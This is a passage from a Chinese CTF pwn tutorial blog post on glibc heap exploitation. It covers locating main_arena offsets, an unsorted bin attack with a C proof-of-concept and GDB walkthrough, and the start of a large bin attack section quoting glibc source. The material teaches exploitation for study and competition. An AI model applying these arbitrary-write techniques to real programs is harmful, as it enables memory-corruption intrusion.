      ar_ptr <span class="token operator">=</span> ar_ptr<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到&nbsp;<code>mstate ar_ptr = &amp;main_arena</code>&nbsp;这里对&nbsp;<code>main_arena</code>&nbsp;进行了访问，所以<strong>通过 IDA 分析 libc 文件中的 <code>malloc_trim()</code> 函数就可以得到 libc 偏移了</strong></p><p>以 Glibc 2.23 中的 <code>malloc_trim()</code> 函数为例：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A863.png" alt="CTF - PWN_堆相关的漏洞与利用63.png"></p><p>其位于 <code>.bss</code> 段上，可见 <code>main_arena</code>&nbsp;与&nbsp;libc&nbsp;基地址的偏移为 <code>0x3C4B20</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A864.png" alt="CTF - PWN_堆相关的漏洞与利用64.png"></p><p>我们以 《<a href="18c02ebd.html">【Asis CTF 2016】b00ks</a>》 一文中泄漏的地址来进行验证：（同为 Glibc 2.23 环境）</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="【Asis CTF 2016】b00ks34.png"></p><p><code>main_arena</code>&nbsp;与&nbsp;libc&nbsp;基地址的偏移为：<code>0x7efea8cc9b20 - 0x7efea8905000 = 0x3c4b20</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A865.png" alt="CTF - PWN_堆相关的漏洞与利用65.png"></p><hr><h3 id="通过-malloc-hook-计算偏移"><a href="#通过-malloc-hook-计算偏移" class="headerlink" title="通过 __malloc_hook 计算偏移"></a>通过 __malloc_hook 计算偏移</h3><p><code>main_arena</code>&nbsp;和&nbsp;<code>__malloc_hook</code>&nbsp;的地址差是 0x10，而大多数的 libc 都可以直接查出&nbsp;<code>__malloc_hook</code>&nbsp;的地址</p><p>因此&nbsp;<code>main_arena</code>&nbsp;与&nbsp;libc&nbsp;基地址的偏移可以直接得到：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Unsorted-bin-Attack-1"><a href="#Unsorted-bin-Attack-1" class="headerlink" title="Unsorted bin Attack"></a>Unsorted bin Attack</h2><p>在 <code>glibc/malloc/malloc.c</code> 中的 <code>_int_malloc</code> 有这么一段代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* remove from unsorted list */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当将一个 <code>unsorted bin</code> 取出的时候，会将 <code>bck -&gt; fd</code> 的位置写入本 <code>unsorted bin</code> 的位置</p><p>也就是说，<strong>如果我们控制了 <code>bk</code> 的值，就能将&nbsp;<code>unsorted_chunks (av)</code>&nbsp;写到任意地址</strong></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"bk pointer point to %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/*------------VULNERABILITY-----------*/</span>

  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//------------------------------------</span>

  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>首先分配了两个堆块 <code>chunk1</code> 和 <code>chunk2</code>，其中第二个堆块用来防止与 <code>top chunk</code> 合并</p><p>然后释放 <code>chunk1</code>，将其置于 <code>unsorted bin</code> 中，可以看到其 <code>bk</code> 指针指向 <code>0x00007ffff7dd1b78</code>，由于此时 <code>unsorted bin</code> 只有一个，因此 <code>fd</code> 与 <code>bk</code> 指针相同</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A866.png" alt="CTF - PWN_堆相关的漏洞与利用66.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A873.png" alt="CTF - PWN_堆相关的漏洞与利用73.png"></p><p>假设我们通过堆溢出或其他手段修改 <code>bk</code> 指针，使其指向 <code>target_var - 16</code> 的位置（这里是以 64 位程序作为示例，如果是 32 位程序，则指向 <code>target_var - 8</code> 的位置）</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A867.png" alt="CTF - PWN_堆相关的漏洞与利用67.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A872.png" alt="CTF - PWN_堆相关的漏洞与利用72.png"></p><p><code>target_var - 16</code> 处是我们伪造的 <code>chunk</code>，即：<code>target_var</code> 处于伪造 <code>chunk</code> 的 <code>fd</code> 处</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A868.png" alt="CTF - PWN_堆相关的漏洞与利用68.png"></p><p>然后，我们通过 <code>malloc(400)</code> 再次申请相同大小的空间</p><p>由于所申请的 <code>chunk</code> 处于 <code>small bin</code> 所在的范围，其对应的 <code>bin</code> 中暂时没有 <code>chunk</code>，所以会去 <code>unsorted bin</code> 中找，发现 <code>unsorted bin</code> 不为空，于是把 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 取出来，而 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 是我们伪造的 <code>chunk</code></p><p>此时堆并没有什么改变，依然是 <code>unsorted bin</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A869.png" alt="CTF - PWN_堆相关的漏洞与利用69.png"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A871.png" alt="CTF - PWN_堆相关的漏洞与利用71.png"></p><p>但是 <code>0x7fffffffdc88</code>（<code>target_var</code>）地址处已经被修改为&nbsp;<code>unsorted bin</code> 的链表头部 <code>0x00007ffff7dd1b78</code>，即 <code>fd</code> 指针：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A870.png" alt="CTF - PWN_堆相关的漏洞与利用70.png"></p><blockquote><p>注意：</p><p>虽然我们修改了&nbsp;<code>target</code> 处的值，但 <code>unsorted bin</code> 链表也可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p></blockquote><p>从上面的示例我们可以看到，<strong>Unsorted bin Attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大</strong>，一般可以作为以下用途：</p><ul><li>我们通过修改循环的次数来使得程序可以执行多次循环</li><li>我们可以修改 <code>heap</code> 中的 <code>global_max_fast</code> 来使得更大的 <code>chunk</code> 可以被视为 <code>fast bin</code>，这样我们就可以去执行一些 <code>fast bin attack</code> 了</li></ul><hr><h1 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h1><blockquote><p>Large bin Attack 是一类漏洞的利用方法，是指所有基于 <code>large bin</code> 机制的漏洞利用方法</p><p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9sYXJnZS1iaW4tYXR0YWNrLw==">Large Bin Attack - CTF Wiki</a></p></blockquote><p>Large bin Attack 主要利用的是 <code>chunk</code> 进入 <code>bin</code> 中的操作，在 <code>malloc</code> 的时候，遍历 <code>unsorted bin</code> 时，对每一个 <code>chunk</code>，若无法 <code>exact-fit</code> 分配或不满足切割分配的条件，就会将该 <code>chunk</code> 置入相应的 <code>bin</code> 中，而此过程中缺乏对 <code>large bin</code> 的跳表指针的检测</p><p>Glibc 2.33 中关于 Large bin 的入 bin 操作：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">else</span>
            <span class="token punctuation">{</span>
              victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
              fwd <span class="token operator">=</span> bck<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>

              <span class="token comment">/* maintain large bins in sorted order */</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                  <span class="token comment">/* Or with inuse bit to speed comparisons */</span>
                  size <span class="token operator">|=</span> PREV_INUSE<span class="token punctuation">;</span>
                  <span class="token comment">/* if smaller than smallest, bypass loop below */</span>
                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span>
              <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>
                      bck <span class="token operator">=</span> bck<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>

                      victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
                      victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
                      fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                  <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                          fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span>
              <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size
              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token comment">/* Always insert in the second position.  */</span>
                        fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
                      <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                          victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
                          victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
                          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">!=</span> fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                          fwd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                          victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                      bck <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> fwd<span class="token punctuation">)</span>
                        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): largebin double linked list corrupted (bk)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Glibc 2.29 及以下的版本中，根据 <code>unsorted bin chunk</code> 的大小不同</p><p>在 <code>unsorted bin chunk</code> 小于链表中最小的 <code>chunk</code> 的时候会执行前一句，反之执行后一句：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">fwd<span class="token operator">-&gt;</span>fd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于两者大小相同的时候只会使用如下的方法插入，所以此时无法利用：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size
              <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token comment">/* Always insert in the second position.  */</span>
                        fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>堆相关漏洞与利用</h></span></div><div class="post-copyright__type"><span class="post-copyright-info">本文链接：<a href="https://www.uf4te.cn/posts/baa7ab63.html">https://www.uf4te.cn/posts/baa7ab63.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="padding-left:6px;display:inline-block;width:120px"><h>作者</h><div class="post-copyright-cc-info"><h>uf4te</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-05-27</h></div></div><div class="post-copyright-u" style="padding-left:6px;display:inline-block;width:120px"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-06-07</h></div></div><div class="post-copyright-c" style="padding-left:6px;display:inline-block;width:120px"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover-126.jpg" data-sites="facebook, twitter, wechat, weibo, qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 奖励一下站长</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/rewards/wechat.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/wechat.png" alt="微信支付"></a><div class="post-qr-code-desc">微信支付</div></li><li class="reward-item"><a href="/img/rewards/alipay.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/alipay.png" alt="支付宝"></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/13f0410d.html" title="Android逆向与动态调试"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-125.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Android逆向与动态调试</div></div></a></div><div class="next-post pull-right"><a href="/posts/18c02ebd.html" title="【Asis CTF 2016】b00ks"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-127.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【Asis CTF 2016】b00ks</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/c695aa69.html" title="Bypass安全机制"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-117.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-10-15</div><div class="title">Bypass安全机制</div></div></a></div><div><a href="/posts/cfa3ef5.html" title="Linux下的保护机制"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-65.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-05</div><div class="title">Linux下的保护机制</div></div></a></div><div><a href="/posts/29133b28.html" title="PLT表和GOT表"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-64.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-05</div><div class="title">PLT表和GOT表</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="author_top is-center"><div class="card-info-avatar"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='this.onerror=null,this.src="/img/404/loading_404.gif"' alt="avatar"></div><div class="author-status-box"><div class="author-status"><g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">😒</g-emoji><span>疲惫心累</span></div></div></div><div class="author-info__name">uf4te</div><div class="author-info__description">天道酬勤</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a><a href="/commentwall/"><div class="headline">评论</div><div class="length-num comment-total">0</div></a><a href="/about/#reward-me"><div class="headline">赞助</div><div class="length-num reward-total">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" 